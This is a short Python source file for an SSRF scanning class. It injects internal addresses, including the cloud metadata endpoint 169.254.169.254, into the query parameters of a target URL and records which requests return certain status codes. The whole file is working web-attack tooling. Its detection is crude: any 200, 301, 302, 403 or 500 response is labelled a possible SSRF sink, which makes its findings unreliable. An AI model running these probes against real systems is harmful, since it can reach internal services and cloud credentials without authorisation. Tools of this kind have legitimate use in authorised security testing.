import requests
import urllib.parse


class SSRFEngine:
    def __init__(self, payload_file=None):
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",
            "http://example.com"
        ]

        if payload_file:
            self.load_file(payload_file)

    def load_file(self, filepath):
        try:
            with open(filepath, "r") as f:
                self.payloads.extend(
                    [x.strip() for x in f if x.strip()]
                )
        except:
            pass

    def inject(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        query[param] = payload

        new_query = urllib.parse.urlencode(query, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def run(self, url, findings):
        results = []

        for f in findings:
            if f["location"] != "query":
                continue

            param = f["param"]

            for payload in self.payloads:
                target = self.inject(url, param, payload)

                try:
                    r = requests.get(target, timeout=8)
                except:
                    continue

                if r.status_code in [200, 301, 302, 403, 500]:
                    results.append({
                        "url": target,
                        "param": param,
                        "payload": payload,
                        "type": "possible SSRF sink"
                    })

        return results
